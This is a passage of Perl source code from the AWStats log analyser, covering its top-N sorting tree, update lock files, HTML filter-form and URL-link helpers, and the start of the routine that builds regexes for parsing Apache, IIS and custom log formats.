				  . ( scalar keys %egal ) . ".",
				4
			);
		}
		return;
	}
	# Val is already in tree
	if ( exists($val{$keyval}) ) {
		if ($Debug) { debug( "  val is already in tree", 4 ); }
		$egal{$keytoadd} = $val{$keyval};
		$val{$keyval}    = $keytoadd;
		if ($Debug) {
			debug(
				"  lowerval=$lowerval, nb elem val="
				  . ( scalar keys %val )
				  . ", nb elem egal="
				  . ( scalar keys %egal ) . ".",
				4
			);
		}
		return;
	}
	if ( $keyval <= $lowerval )
	# Val is a new one lower (should happens only when tree is not full)
	{
		if ($Debug) {
			debug( " keytoadd val=$keyval is lower or equal to lowerval=$lowerval",
				4
			);
		}
		$val{$keyval}     = $keytoadd;
		$nextval{$keyval} = $lowerval;
		$lowerval         = $keyval;
		if ($Debug) {
			debug( " lowerval=$lowerval, nb elem val="
				  . ( scalar keys %val )
				  . ", nb elem egal="
				  . ( scalar keys %egal ) . ".",
				4
			);
		}
		return;
	}

	# Val is a new one higher
	if ($Debug) {
		debug( " keytoadd val=$keyval is higher than lowerval=$lowerval", 4 );
	}
	$val{$keyval} = $keytoadd;
	# valcursor is value just before keyval
	my $valcursor = $lowerval;
	while ( $nextval{$valcursor} && ( $nextval{$valcursor} < $keyval ) ) {
		$valcursor = $nextval{$valcursor};
	}
	# keyval is between valcursor and nextval{valcursor}
	if ( exists($nextval{$valcursor}) )
	{ $nextval{$keyval} = $nextval{$valcursor}; }
	$nextval{$valcursor} = $keyval;
	if ($Debug) {
		debug(
			"  lowerval=$lowerval, nb elem val="
			  . ( scalar keys %val )
			  . ", nb elem egal="
			  . ( scalar keys %egal ) . ".",
			4
		);
	}
}

#------------------------------------------------------------------------------
# Function:     Remove the smallest value from the sorting tree
# Description:  Removes the current minimum value node from the tree and updates
#               the tree structure. When a key has multiple equal values, they
#               are maintained in the egal hash.
# Parameters:   None
# Input:        $lowerval - Current minimum value in the tree
#               %val      - Hash mapping values to keys
#               %egal     - Hash mapping keys to their equal-value alternatives
#               %nextval  - Hash linking values in ascending order
# Output:       Updated %val, %egal, %nextval, and $lowerval
# Return:       None
#------------------------------------------------------------------------------
sub Removelowerval {
	my $keytoremove = $val{$lowerval};

	if ($Debug) {
		debug( " remove for lowerval=$lowerval: key=$keytoremove", 4 );
	}

	if ( exists($egal{$keytoremove}) ) {
		$val{$lowerval} = $egal{$keytoremove};
		delete $egal{$keytoremove};
	}
	else {
		delete $val{$lowerval};
		$lowerval = $nextval{$lowerval};
	}

	if ($Debug) {
		debug(
			"   new lower value=$lowerval, val size="
			  . ( scalar keys %val )
			  . ", egal size="
			  . ( scalar keys %egal ),
			4
		);
	}
}

#------------------------------------------------------------------------------
# Function:     Build @keylist array
# Parameters:   Size max for @keylist array,
#               Min value in hash for select,
#               Hash used for select,
#               Hash used for order
# Input:        None
# Output:       None
# Return:       @keylist response array
#------------------------------------------------------------------------------
sub BuildKeyList {
	my $ArraySize = shift || error( "System error. Call to BuildKeyList function with incorrect value for first param", "", "", 1 );
	my $MinValue = shift || error( "System error. Call to BuildKeyList function with incorrect value for second param", "", "", 1 );
	my $hashforselect = shift;
	my $hashfororder  = shift;
	if ($Debug) {
		debug( " BuildKeyList($ArraySize,$MinValue,$hashforselect with size="
			  . ( scalar keys %$hashforselect )
			  . ",$hashfororder with size="
			  . ( scalar keys %$hashfororder ) . ")", 3
		);
	}
	# Those is to protect from infinite loop when hash array has an incorrect null key
	delete $hashforselect->{ '' };
	my $count = 0;
	# Global because used in AddInTree and Removelowerval
	$lowerval = 0;
	%val      = ();
	%nextval  = ();
	%egal     = ();

	foreach my $key ( keys %$hashforselect ) {
		if ( $count < $ArraySize ) {
			if ( $hashforselect->{$key} >= $MinValue ) {
				$count++;
				if ($Debug) {
					debug(
						"  Add in tree entry $count : $key (value="
						  . ( $hashfororder->{$key} || 0 )
						  . ", tree not full)",
						4
					);
				}
				AddInTree( $key, $hashfororder->{$key} || 0, $count );
			}
			next;
		}
		$count++;
		if ( ( $hashfororder->{$key} || 0 ) <= $lowerval ) { next; }
		if ($Debug) {
			debug(
				"  Add in tree entry $count : $key (value="
				  . ( $hashfororder->{$key} || 0 )
				  . " > lowerval=$lowerval)",
				4
			);
		}
		AddInTree( $key, $hashfororder->{$key} || 0 );
		if ($Debug) { debug( "  Removelower in tree", 4 ); }
		Removelowerval();
	}

	# Build key list and sort it
	if ($Debug) {
		debug(
			"  Build key list and sort it. lowerval=$lowerval, nb elem val="
			  . ( scalar keys %val )
			  . ", nb elem egal="
			  . ( scalar keys %egal ) . ".",
			3
		);
	}
	my %notsortedkeylist = ();
	foreach my $key ( values %val )  { $notsortedkeylist{$key} = 1; }
	foreach my $key ( values %egal ) { $notsortedkeylist{$key} = 1; }
	@keylist = ();
	@keylist = (
		sort { ( $hashfororder->{$b} || 0 ) <=> ( $hashfororder->{$a} || 0 ) }
		  keys %notsortedkeylist
	);
	if ($Debug) {
		debug( "  BuildKeyList End (keylist size=" . (@keylist) . ")", 3 );
	}
	return;
}

#------------------------------------------------------------------------------
# Function:     Lock or unlock update
# Parameters:   status (1 to lock, 0 to unlock)
# Input:        $DirLock (if status=0) $PROG $FileSuffix
# Output:       $DirLock (if status=1)
# Return:       None
#------------------------------------------------------------------------------
sub Lock_Update {
	my $status = shift;
	my $lock   = "$PROG$FileSuffix.lock";
	if ($status) {

		# We stop if there is at least one lock file wherever it is
		foreach my $key ( ($ENV{"TEMP"} || ""), ($ENV{"TMP"} || ""), "/tmp", "/", "." ) {
			next unless defined $key && $key ne "";
			my $newkey = $key;
			$newkey =~ s/[\\\/]$//;
			if ( -f "$newkey/$lock" ) {
				error( _t("An AWStats update process seems to be already running for this config file. Try later. If this is not true, remove manually lock file") . " '$newkey/$lock'.", "", "", 1 );
			}
		}

		# Set lock where we can
		foreach my $key ( ($ENV{"TEMP"} || ""), ($ENV{"TMP"} || ""), "/tmp", "/", "." ) {
			next unless $key && -d "$key";
			$DirLock = $key;
			$DirLock =~ s/[\\\/]$//;
			if ($Debug) { debug("Update lock file $DirLock/$lock is set"); }
			open( LOCK, ">$DirLock/$lock" ) || error( "Failed to create lock file $DirLock/$lock", "", "",
				1 );
			print LOCK "AWStats update started by process $$ at $nowyear-$nowmonth-$nowday $nowhour:$nowmin:$nowsec\n";
			close(LOCK);
			last;
		}
	}
	# Remove lock
	else {
		if ($Debug) { debug("Update lock file $DirLock/$lock is removed"); }
		unlink("$DirLock/$lock");
	}
	return;
}

#------------------------------------------------------------------------------
# Function:     Signal handler to call Lock_Update to remove lock file
# Parameters:   Signal name
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub SigHandler {
	my $signame = shift;
	printf _t("%s process (ID %s) interrupted by signal %s."), 
	ucfirst($PROG), $$, $signame;
	&Lock_Update(0);
	exit 1;
}

#------------------------------------------------------------------------------
# Function:     Convert an IPv4 address into an integer
# Parameters:   IPAddress (e.g., '192.168.1.1')
# Input:        None
# Output:       None
# Return:       Integer (e.g., 3232235521)
#------------------------------------------------------------------------------
sub Convert_IP_To_Decimal {
	my ($IPAddress) = @_;
	my @ip = split(/\./, $IPAddress);
	return ($ip[0] << 24) + ($ip[1] << 16) + ($ip[2] << 8) + $ip[3];
}

#------------------------------------------------------------------------------
# Function:     Test there is at least one value in list not null
# Parameters:   List of values
# Input:        None
# Output:       None
# Return:       1 There is at least one not null value, 0 else
#------------------------------------------------------------------------------
sub AtLeastOneNotNull {
	if ($Debug) {
		debug( " Call to AtLeastOneNotNull (" . join( '-', @_ ) . ")", 3 );
	}
	foreach my $val (@_) {
		if ($val) { return 1; }
	}
	return 0;
}

#------------------------------------------------------------------------------
# Function:     Return the string to add in html tag to include tooltip text
# Parameters:   tooltip number
# Input:        None
# Output:       None
# Return:       string with title attribute containing translated tooltip text
#------------------------------------------------------------------------------
sub Tooltip {
	my $ttnb = shift;
	my $tooltip_text = _t("tooltip_$ttnb");
	return $tooltip_text ? qq{ title="$tooltip_text"} : '';
}

#------------------------------------------------------------------------------
# Function:     Insert a form filter
# Parameters:   Name of filter field, default for filter field, default for exclude filter field
# Input:        $StaticLinks, $QueryString, $SiteConfig, $DirConfig
# Output:       HTML Form
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowFormFilter {
	my $fieldfiltername    = shift;
	my $fieldfilterinvalue = shift;
	my $fieldfilterexvalue = shift;
	if ( !$StaticLinks ) {
		my $NewLinkParams = ${QueryString};
		$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)output(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
		print qq{\n<form name="FormFilter" action="} . XMLEncode("$AWScript${NewLinkParams}") . qq{" class="aws_border">};
		print "<table valign=\"middle\" width=\"99%\" border=\"0\" cellspacing=\"0\" cellpadding=\"2\"><tr>";
		print "<td align=\"left\" width=\"50\">" . _t("Filter") . "&nbsp;:</td>\n";
		print "<td align=\"left\" width=\"100\"><input type=\"text\" name=\"${fieldfiltername}\" value=\"$fieldfilterinvalue\" class=\"aws_formfield\" /></td>\n";
		print "<td> &nbsp; </td>\n";
		print "<td align=\"left\" width=\"100\">" . _t("Exclude filter") . "&nbsp;:</td>\n";
		print "<td align=\"left\" width=\"100\"><input type=\"text\" name=\"${fieldfiltername}ex\" value=\"$fieldfilterexvalue\" class=\"aws_formfield\" /></td>\n";
		print "<td>";
		print qq{<input type="hidden" name="output" value="} . join( ',', keys %HTMLOutput ) . qq{">};

		if ($SiteConfig) {
			print "<input type=\"hidden\" name=\"config\" value=\"$SiteConfig\">";
		}
		if ($DirConfig) {
			print "<input type=\"hidden\" name=\"configdir\" value=\"$DirConfig\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)year=(\d\d\d\d)/i ) {
			print "<input type=\"hidden\" name=\"year\" value=\"$2\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)month=(\d\d)/i || $QueryString =~ /(^|&|&amp;)month=(all)/i )
		{
			print "<input type=\"hidden\" name=\"month\" value=\"$2\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)lang=(\w+)/i ) {
			print "<input type=\"hidden\" name=\"lang\" value=\"$2\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)debug=(\d+)/i ) {
			print "<input type=\"hidden\" name=\"debug\" value=\"$2\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)framename=(\w+)/i ) {
			print "<input type=\"hidden\" name=\"framename\" value=\"$2\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)databasebreak=(\w+)/i) {
			print "<input type=\"hidden\" name=\"databasebreak\" value=\"$2\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)day=(\d\d)/i) {
			print "<input type=\"hidden\" name=\"day\" value=\"$2\">";
		}
		if ( $QueryString =~ /(^|&|&amp;)hour=(\d\d)/i) {
			print "<input type=\"hidden\" name=\"hour\" value=\"$2\">";
		}
		print "<input type=\"submit\" value=\" " . _t("OK") . " \" class=\"aws_button\" /></td>\n";
		print "<td> &nbsp; </td>\n";
		print "</tr></table>";
		print "</form>";
		print "<br>";
		print "\n";
	}
}

#------------------------------------------------------------------------------
# Function:     Write other user info (with help of plugin)
# Parameters:   $user
# Input:        $SiteConfig
# Output:       URL link
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowUserInfo {
	my $user = shift;

	# Call to plugins' function ShowInfoUser
	foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoUser'} } ) {
		my $function = "ShowInfoUser_$pluginname";
		&$function($user);
	}
}

#------------------------------------------------------------------------------
# Function:     Write other cluster info (with help of plugin)
# Parameters:   $clusternb
# Input:        $SiteConfig
# Output:       Cluster info
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowClusterInfo {
	my $cluster = shift;

	# Call to plugins' function ShowInfoCluster
	foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoCluster'} } )
	{
		my $function = "ShowInfoCluster_$pluginname";
		&$function($cluster);
	}
}

#------------------------------------------------------------------------------
# Function:     Write other host info (with help of plugin)
# Parameters:   $host
# Input:        $LinksToWhoIs $LinksToWhoIsIp
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowHostInfo {
	my $host = shift;

	# Call to plugins' function ShowInfoHost
	foreach my $pluginname ( sort keys %{ $PluginsLoaded{'ShowInfoHost'} } ) {
		my $function = "ShowInfoHost_$pluginname";
		&$function($host);
	}
}

#------------------------------------------------------------------------------
# Function:     Write other url info (with help of plugin)
# Parameters:   $url
# Input:        %Aliases $MaxLengthOfShownURL $ShowLinksOnUrl $SiteDomain $UseHTTPSLinkForUrl
# Output:       URL link
# Return:       None
#------------------------------------------------------------------------------
sub HTMLShowURLInfo {
	my $url     = shift;
	my $nompage = CleanXSS($url);
	
	if ($PageDir == 1) {
		$nompage = reverse($nompage);
	}
	# Call to plugins' function ShowInfoURL
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowInfoURL'} } ) {
		my $function = "ShowInfoURL_$pluginname";
		&$function($url);
	}

	if ( length($nompage) > $MaxLengthOfShownURL ) {
		$nompage = substr( $nompage, 0, $MaxLengthOfShownURL ) . "...";
	}
	if ($ShowLinksOnUrl) {
		my $newkey = CleanXSS($url);
		# Web or streaming log file
		# URL seems to be extracted from a proxy log file
		if ( $LogType eq 'W' || $LogType eq 'S' ) {
			if ( $newkey =~ /^http(s|):/i )
			{
				print "<a href=\""
				  . XMLEncode("$newkey")
				  . "\" target=\"url\" rel=\"nofollow noopener noreferrer\">"
				  . XMLEncode($nompage) . "</a>";
			}
			elsif ( $newkey =~ /^\// )
			# URL seems to be an url extracted from a web or wap server log file
			{ 
				$newkey =~ s/^\/$SiteDomain//i;

				# Define urlprot
				my $urlprot = 'http';
				if ( $UseHTTPSLinkForUrl && $newkey =~ /^$UseHTTPSLinkForUrl/ )
				{
					$urlprot = 'https';
				}
				print "<a href=\""
				  . XMLEncode("$urlprot://$SiteDomain$newkey")
				  . "\" target=\"url\" rel=\"nofollow noopener noreferrer\">"
				  . XMLEncode($nompage) . "</a>";
			}
			else {
				print XMLEncode($nompage);
			}
		}
		# Ftp log file
		elsif ( $LogType eq 'F' ) {
			print XMLEncode($nompage);
		}
		# Smtp log file
		elsif ( $LogType eq 'M' ) {
			print XMLEncode($nompage);
		}
		# Other type log file
		else {
			print XMLEncode($nompage);
		}
	}
	else {
		print XMLEncode($nompage);
	}
}

#------------------------------------------------------------------------------
# Function:     Define value for PerlParsingFormat (used for regex log record parsing)
# Parameters:   $LogFormat
# Input:        -
# Output:       $pos_xxx, @pos_extra, @fieldlib, $PerlParsingFormat
# Return:       -
#------------------------------------------------------------------------------
sub DefinePerlParsingFormat {
	my $LogFormat = shift;
	$pos_vh = $pos_host = $pos_logname = $pos_date = $pos_tz = $pos_method =
	  $pos_url = $pos_code = $pos_size = $pos_time = -1;
	$pos_referer = $pos_agent = $pos_query = $pos_gzipin = $pos_gzipout =
	  $pos_compratio   = -1;
	$pos_cluster       = $pos_emails = $pos_emailr = $pos_hostr = -1;
	@pos_extra         = ();
	@fieldlib          = ();
	$PerlParsingFormat = '';
#------------------------------------------------------------------------------
# Log record examples (supports various web server formats):
#
# Apache combined (modern):    192.168.1.100 - - [03/Jun/2026:10:30:00 +0800] "GET /api/users HTTP/2.0" 200 2048 "https://example.com/referrer" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
#
# Apache combined (legacy):    62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "GET / HTTP/1.1" 200 1234 "https://example.com/page.html" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
#
# Apache error (408 timeout):  my.domain.com - user [09/Jan/2001:11:38:51 -0600] "OPTIONS /mime-tmp/xxx%20file.doc HTTP/1.1" 408 - "-" "-"
#
# Apache error (400 bad req):  80.8.55.11 - - [28/Apr/2007:03:20:02 +0200] "GET /" 400 584 "-" "-"
#
# IIS (Windows):               2026-06-03 10:30:00 192.168.1.100 - GET /api/users 200 2048 HTTP/2.0 Mozilla/5.0+(compatible;+Modern+Browser) https://example.com/referrer
#
# Nginx JSON:                  {"remote_addr":"192.168.1.100","time_local":"03/Jun/2026:10:30:00 +0800","request":"GET /api/users HTTP/2.0","status":200,"body_bytes_sent":2048,"http_referer":"https://example.com/referrer","http_user_agent":"Mozilla/5.0 ..."}
#
# Caddy (CLF):                 192.168.1.100 - - [03/Jun/2026:10:30:00 +0000] "GET /api/users HTTP/2.0" 200 2048
#
# Supported log format directives:
# Apache common_with_mod_gzip_info1: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_compression_ratio}npct.
# Apache common_with_mod_gzip_info2: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_result}n In:%{mod_gzip_input_size}n Out:%{mod_gzip_output_size}n:%{mod_gzip_compression_ratio}npct.
# Apache deflate:                  %h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" (%{ratio}n)
#
# Legacy formats (still supported):
# WebStar:                     05/21/00	00:17:31	OK  	200	212.242.30.6	Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)	https://example.com	"example.com"	:Documentation:graphics:logo.gif	1133
# Squid proxy:                 12.229.91.170 - - [27/Jun/2002:03:30:50 -0700] "GET https://example.com/page.gif HTTP/1.1" 304 354 "-" "Mozilla/5.0 Galeon/1.0.3" TCP_REFRESH_HIT:DIRECT
#------------------------------------------------------------------------------
	if ($Debug) {
		debug("Call To DefinePerlParsingFormat (LogType='$LogType', LogFormat='$LogFormat')");
	}
	# Same than "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"".
	# %u (user) is "([^\\/\\[]+)" instead of "[^ ]+" because can contain space (Lotus Notes). referer and ua might be "".
	# $PerlParsingFormat="([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
	if ( $LogFormat =~ /^[1-6]$/ ) {    # Pre-defined log format
		if ( $LogFormat eq '1' || $LogFormat eq '6' )
		{
			$PerlParsingFormat = "([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
			$pos_host    = 0;
			$pos_logname = 1;
			$pos_date    = 2;
			$pos_method  = 3;
			$pos_url     = 4;
			$pos_code    = 5;
			$pos_size    = 6;
			$pos_referer = 7;
			$pos_agent   = 8;
			@fieldlib = ( 'host', 'logname', 'date', 'method', 'url', 'code', 'size', 'referer', 'ua' );
		}
		# Same than "date time c-ip cs-username cs-method cs-uri-stem sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)"
		elsif ( $LogFormat eq '2' )
		{
			$PerlParsingFormat = "(\\S+ \\S+) (\\S+) (\\S+) (\\S+) (\\S+) ([\\d|-]+) ([\\d|-]+) \\S+ (\\S+) (\\S+)";
			$pos_date    = 0;
			$pos_host    = 1;
			$pos_logname = 2;
			$pos_method  = 3;
			$pos_url     = 4;
			$pos_code    = 5;
			$pos_size    = 6;
			$pos_agent   = 7;
			$pos_referer = 8;
			@fieldlib = ( 'date', 'host', 'logname', 'method', 'url', 'code', 'size', 'ua', 'referer' );
		}
		elsif ( $LogFormat eq '3' ) {
			$PerlParsingFormat = "([^\\t]*\\t[^\\t]*)\\t([^\\t]*)\\t([\\d|-]*)\\t([^\\t]*)\\t([^\\t]*)\\t([^\\t]*)\\t[^\\t]*\\t([^\\t]*)\\t([\\d]*)";
			$pos_date    = 0;
			$pos_method  = 1;
			$pos_code    = 2;
			$pos_host    = 3;
			$pos_agent   = 4;
			$pos_referer = 5;
			$pos_url     = 6;
			$pos_size    = 7;
			@fieldlib = ( 'date', 'method', 'code', 'host', 'ua', 'referer', 'url', 'size' );
		}
		# Same than "%h %l %u %t \"%r\" %>s %b"
		# %u (user) is "(.+)" instead of "[^ ]+" because can contain space (Lotus Notes).
		# Sample: 10.100.10.45 - BMAA\will.smith [01/Jul/2013:07:17:28 +0200] "GET /Download/__Omnia__Aus- und Weiterbildung__Konsular- und Verwaltungskonferenz, Programm.doc HTTP/1.1" 200 9076810
		# $PerlParsingFormat =  "([^ ]+) [^ ]+ (.+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+)";
		elsif ( $LogFormat eq '4' ) {
			$PerlParsingFormat =  "([^ ]+) [^ ]+ (.+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+)";
			$pos_host    = 0;
			$pos_logname = 1;
			$pos_date    = 2;
			$pos_method  = 3;
			$pos_url     = 4;
			$pos_code    = 5;
			$pos_size    = 6;
			@fieldlib    = ( 'host', 'logname', 'date', 'method', 'url', 'code', 'size' );
		}
	}
	elsif ( $LogFormat eq 'json' ) {
		$PerlParsingFormat = 'json';
		$PerlParsingFormatJsonMap = JSON::XS->new->utf8->decode($LogFormatJsonMap);
		@fieldlib = keys % {$PerlParsingFormatJsonMap};
		for my $i (0 .. $#fieldlib) {
			my $f_name = $fieldlib[$i];
			my $pos_var_suf = $f_name;
			if ($f_name =~ /time[12]/) {
				$pos_var_suf = "date";
			} elsif ($f_name =~  /extra([0-9]+)/) {
				$pos_var_suf =~ s/extra//;
				$pos_extra[$pos_var_suf] = $i;
				next;
			}
			my $k = "pos_$pos_var_suf";
			eval "\$$k = \$i;";
		}
	}
	# Personalized log format
	# Replacement for Notes format string that are not Apache
	# Replacement for Apache format string
	else {
		my $LogFormatString = $LogFormat;
		$LogFormatString =~ s/%vh/%virtualname/g;
		$LogFormatString =~ s/%v(\s)/%virtualname$1/g;
		$LogFormatString =~ s/%v$/%virtualname/g;
		$LogFormatString =~ s/%h(\s)/%host$1/g;
		$LogFormatString =~ s/%h$/%host/g;
		$LogFormatString =~ s/%l(\s)/%other$1/g;
		$LogFormatString =~ s/%l$/%other/g;
		$LogFormatString =~ s/\"%u\"/%lognamequot/g;
		$LogFormatString =~ s/%u(\s)/%logname$1/g;
		$LogFormatString =~ s/%u$/%logname/g;
		$LogFormatString =~ s/%t(\s)/%time1$1/g;
		$LogFormatString =~ s/%t$/%time1/g;
		$LogFormatString =~ s/\"%r\"/%methodurl/g;
		$LogFormatString =~ s/%>s/%code/g;
		$LogFormatString =~ s/%b(\s)/%bytesd$1/g;
		$LogFormatString =~ s/%b$/%bytesd/g;
		$LogFormatString =~ s/\"%\{Referer}i\"/%refererquot/g;
		$LogFormatString =~ s/\"%\{User-Agent}i\"/%uaquot/g;
		$LogFormatString =~ s/%\{mod_gzip_input_size}n/%gzipin/g;
		$LogFormatString =~ s/%\{mod_gzip_output_size}n/%gzipout/g;
		$LogFormatString =~ s/%\{mod_gzip_compression_ratio}n/%gzipratio/g;
		$LogFormatString =~ s/\(%\{ratio}n\)/%deflateratio/g;
		$LogFormatString =~ s/cs-uri-query/%query/g;
		$LogFormatString =~ s/date\stime/%time2/g;
		$LogFormatString =~ s/c-ip/%host/g;
		$LogFormatString =~ s/cs-username/%logname/g;
		$LogFormatString =~ s/cs-method/%method/g;
		$LogFormatString =~ s/cs-uri-stem/%url/g;
		$LogFormatString =~ s/cs-uri/%url/g;
		$LogFormatString =~ s/sc-status/%code/g;
		$LogFormatString =~ s/sc-bytes/%bytesd/g;
		$LogFormatString =~ s/cs-version/%other/g;
		$LogFormatString =~ s/cs\(User-Agent\)/%ua/g;
		$LogFormatString =~ s/c-agent/%ua/g;
		$LogFormatString =~ s/cs\(Referer\)/%referer/g;
		$LogFormatString =~ s/cs-referred/%referer/g;
		$LogFormatString =~ s/sc-authenticated/%other/g;
		$LogFormatString =~ s/s-svcname/%other/g;
		$LogFormatString =~ s/s-computername/%other/g;
		$LogFormatString =~ s/r-host/%virtualname/g;
		$LogFormatString =~ s/cs-host/%virtualname/g;
		$LogFormatString =~ s/r-ip/%other/g;
		$LogFormatString =~ s/r-port/%other/g;
		$LogFormatString =~ s/time-taken/%other/g;
		$LogFormatString =~ s/cs-bytes/%other/g;
		$LogFormatString =~ s/cs-protocol/%other/g;
		$LogFormatString =~ s/cs-transport/%other/g;
		$LogFormatString =~ s/s-operation/%method/g;
		$LogFormatString =~ s/cs-mime-type/%other/g;
		$LogFormatString =~ s/s-object-source/%other/g;
		$LogFormatString =~ s/s-cache-info/%other/g;
		$LogFormatString =~ s/cluster-node/%cluster/g;
		$LogFormatString =~ s/s-sitename/%other/g;
		$LogFormatString =~ s/s-ip/%other/g;
		$LogFormatString =~ s/s-port/%other/g;
		$LogFormatString =~ s/cs\(Cookie\)/%other/g;
		$LogFormatString =~ s/sc-substatus/%other/g;
		$LogFormatString =~ s/sc-win32-status/%other/g;
		$LogFormatString =~ s/protocol/%protocolmms/g;
		$LogFormatString =~ s/c-status/%codemms/g;
		if ($Debug) { debug(" LogFormatString=$LogFormatString"); }
		# $LogFormatString has an AWStats format, so we can generate PerlParsingFormat variable
		my $i                       = 0;
		my $LogSeparatorWithoutStar = $LogSeparator;
		$LogSeparatorWithoutStar =~ s/[\*\+]//g;
		foreach my $f ( split( /\s+/, $LogFormatString ) ) {
			if ($PerlParsingFormat) { $PerlParsingFormat .= "$LogSeparator"; }
			# If field is prefixed with custom string, just push it to regex literally
			if ( $f =~ /^([^%]+)%/ ) { $PerlParsingFormat .= "$1"; }
			# logname can be "value", "" and - in same log (Lotus notes)
			elsif ( $f =~ /%lognamequot$/ ) {
				$pos_logname = $i;
				$i++;
				push @fieldlib, 'logname';
				$PerlParsingFormat .= "\\\"?([^\\\"]*)\\\"?";
			}
			# %u (user) is "([^\\/\\[]+)" instead of "[^$LogSeparatorWithoutStar]+" because can contain space (Lotus Notes).
			elsif ( $f =~ /%logname$/ ) {
				$pos_logname = $i;
				$i++;
				push @fieldlib, 'logname';
				$PerlParsingFormat .= "([^\\/\\[]+)";
			}
			# [dd/mmm/yyyy:hh:mm:ss +0000] or [dd/mmm/yyyy:hh:mm:ss],  time1b kept for backward compatibility
			elsif ( $f =~ /%time1$/ || $f =~ /%time1b$/ ) {
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$pos_tz = $i;
				$i++;
				push @fieldlib, 'tz';
				$PerlParsingFormat .= "\\[([^$LogSeparatorWithoutStar]+)( [^$LogSeparatorWithoutStar]+)?\\]";
			}
			# yyyy-mm-dd hh:mm:ss
			# Need \s for Exchange log files
			elsif ( $f =~ /%time2$/ ) {
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+\\s[^$LogSeparatorWithoutStar]+)";
			}
			# mon d hh:mm:ss  or  mon  d hh:mm:ss  or  mon dd hh:mm:ss yyyy  or  day mon dd hh:mm:ss  or  day mon dd hh:mm:ss yyyy
			elsif ( $f =~ /%time3$/ ) {
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$PerlParsingFormat .= "(?:\\w\\w\\w )?(\\w\\w\\w \\s?\\d+ \\d\\d:\\d\\d:\\d\\d(?: \\d\\d\\d\\d)?)";
			}
			elsif ( $f =~ /%time4$/ ) {
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$PerlParsingFormat .= "(\\d+)";
			}
			# Supports the following formats:
			# - yyyy-mm-ddThh:mm:ss           (Incomplete ISO 8601)
			# - yyyy-mm-ddThh:mm:ssZ          (ISO 8601, zero meridian)
			# - yyyy-mm-ddThh:mm:ss+00:00     (ISO 8601)
			# - yyyy-mm-ddThh:mm:ss+0000      (Apache's best approximation to ISO 8601 using "%{%Y-%m-%dT%H:%M:%S%z}t" in LogFormat)
			# - yyyy-mm-ddThh:mm:ss.000000Z   (Amazon AWS log files)
			elsif ( $f =~ /%time5$/ ) {
				$pos_date = $i;
				$i++;
				push @fieldlib, 'date';
				$pos_tz = $i;
				$i++;
				push @fieldlib, 'tz';
				$PerlParsingFormat .= "([^$LogSeparatorWithoutStar]+T[^$LogSeparatorWithoutStar]+)(Z|[-+\.]\\d\\d[:\\.\\dZ]*)?";
			}
			# dd/mm/yyyy, hh:mm:ss - added additional type to format for IIS date -DWG 12/8/2008
			elsif ( $f =~ /%time6$/ ) {
				$pos_date = $i;	
				$i++; 
				push @fieldlib, 'date';
				$PerlParsingFormat .= "([^,]+,[^,]+)";
			}
			# Special for methodurl, methodurlprot and methodurlnoprot
			#"\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+) [^\\\"]+\\\"";
			elsif ( $f =~ /%methodurl$/ ) {
				$pos_method = $i;
				$i++;
				push @fieldlib, 'method';
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+) ([^$LogSeparatorWithoutStar]+)(?: [^\\\"]+|)\\\"";
			}
			elsif ( $f =~ /%methodurlprot$/ ) {
				$pos_method = $i;
				$i++;
				push @fieldlib, 'method';
				$pos_url = $i;
				$i++;
				push @fieldlib, 'url';
				$PerlParsingFormat .= "\\\"([^$LogSeparatorWithoutStar]+) ([^\\\"]+) ([^\\\"]+)\\\"";
			}
			elsif ( $f =~ /%methodurlnoprot$/ ) {
				$pos_method = $i;
